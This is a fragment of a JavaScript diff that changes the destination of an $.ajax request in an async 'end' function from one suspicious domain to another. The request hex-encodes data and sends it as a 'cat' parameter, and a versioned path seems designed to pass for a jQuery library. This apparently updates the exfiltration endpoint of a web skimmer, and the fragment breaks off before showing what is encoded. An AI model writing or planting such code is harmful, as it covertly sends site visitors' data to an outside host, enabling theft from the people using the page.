@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://system-alexhost.biz.id/halo/3.7.1/?cat=" +
+                    "https://alexbackhost.my.id/halo/?cat=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
